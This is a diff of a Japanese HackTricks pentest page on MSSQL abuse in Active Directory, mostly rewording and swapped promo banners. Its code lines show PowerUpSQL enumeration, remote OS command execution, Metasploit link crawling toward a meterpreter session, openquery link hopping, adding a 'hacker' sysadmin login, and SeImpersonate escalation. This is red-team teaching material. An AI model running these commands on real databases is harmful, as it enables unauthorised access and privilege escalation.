@@ -2,23 +2,23 @@
 
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学びましょう</strong></a><strong>！</strong></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
-* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れます
-* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **ハッキングトリックを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで企業を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
+* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れましょう
+* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **ハッキングトリックを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**
 
 </details>
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 ## **MSSQL列挙/発見**
 
-PowerUpSQLというPowerShellモジュールは、この場合非常に便利です。
+この場合、PowerUpSQLというPowerShellモジュールが非常に役立ちます。
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
@@ -36,7 +36,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### ドメイン内からの列挙
+### ドメイン内部からの列挙
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -84,9 +84,9 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ## MSSQL信頼されたリンク
 
-もしMSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合、ユーザーが信頼されたデータベースに権限を持っている場合、**信頼関係を使用して他のインスタンスでもクエリを実行できる**ようになります。これらの信頼関係は連鎖することができ、ユーザーはいくつかの構成ミスがあるデータベースを見つけてコマンドを実行できるかもしれません。
+MSSQLインスタンスが別のMSSQLインスタンスによって信頼されている場合。ユーザーが信頼されたデータベースに権限を持っている場合、**信頼関係を使用して他のインスタンスでもクエリを実行できる**ようになります。この信頼関係は連鎖することができ、ユーザーはいくつかの構成ミスがあるデータベースを見つけてコマンドを実行できるかもしれません。
 
-**データベース間のリンクは、フォレストトラストを超えても機能します。**
+**データベース間のリンクは、フォレストトラストを超えて機能します。**
 
 ### Powershellの悪用
 ```powershell
@@ -128,19 +128,15 @@ Metasploitを使用して簡単に信頼されたリンクをチェックでき�
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-メタスプロイトはMSSQLの`openquery()`関数のみを悪用しようとします（つまり、`openquery()`でコマンドを実行できない場合は、コマンドを実行するために`EXECUTE`メソッドを**手動**で試す必要があります。詳細は以下を参照してください。）
-
 ### 手動 - Openquery()
 
 **Linux**からは、**sqsh**と**mssqlclient.py**を使用してMSSQLコンソールシェルを取得できます。
 
-**Windows**からは、[**HeidiSQL**](https://www.heidisql.com)のような**MSSQLクライアント**を使用してリンクを見つけ、コマンドを手動で実行することもできます。
+**Windows**からは、[**HeidiSQL**](https://www.heidisql.com)のような**MSSQLクライアント**を使用してリンクを見つけ、コマンドを手動で実行できます。
 
 _Windows認証を使用してログイン:_
 
 ![](<../../.gitbook/assets/image (805).png>)
-
-#### 信頼できるリンクの検索
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
@@ -149,12 +145,12 @@ EXEC sp_linkedservers;
 
 #### 信頼できるリンクでクエリを実行する
 
-リンクを介してクエリを実行します（例：新しいアクセス可能なインスタンスでより多くのリンクを見つける）：
+リンクを介してクエリを実行します（例：新しいアクセス可能なインスタンスでより多くのリンクを見つける）。
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 {% hint style="warning" %}
-二重引用符と単一引用符の使用を確認してください。それをそのまま使用することが重要です。
+二重引用符と単一引用符の使用方法を確認してください。その方法で使用することが重要です。
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (640).png>)
@@ -177,8 +173,25 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## ローカル特権昇格
 
-**MSSQLローカルユーザー**は通常、**`SeImpersonatePrivilege`**と呼ばれる特別な特権を持っています。これにより、アカウントは「認証後にクライアントを模倣する」ことができます。
+**MSSQLローカルユーザー**は通常、**`SeImpersonatePrivilege`**と呼ばれる特別な特権を持っています。これにより、アカウントは「認証後にクライアントを偽装する」ことができます。
 
-多くの著者が考えた戦略は、SYSTEMサービスを、攻撃者が作成したローグまたは中間者サービスに認証させることです。このローグサービスは、SYSTEMサービスが認証しようとしている間にSYSTEMサービスを模倣することができます。
+多くの著者が考案した戦略は、SYSTEMサービスを、攻撃者が作成したローグまたは中間者サービスに認証させることです。このローグサービスは、SYSTEMサービスが認証しようとしている間にSYSTEMサービスを偽装することができます。
 
-[SweetPotato](https://github.com/CCob/SweetPotato)には、Beaconの`execute-assembly`コマンドを介して実行できるこれらのさまざまなテクニックが収録されています。
+[SweetPotato](https://github.com/CCob/SweetPotato)には、Beaconの`execute-assembly`コマンドを介して実行できるこれらのさまざまなテクニックが収集されています。
+
+
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://websec.nl/" %}
+
+<details>
+
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>でゼロからヒーローまでAWSハッキングを学びましょう</summary>
+
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
+* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れます
+* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
+* **ハッキングトリックを共有するために、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**
+
+</details>
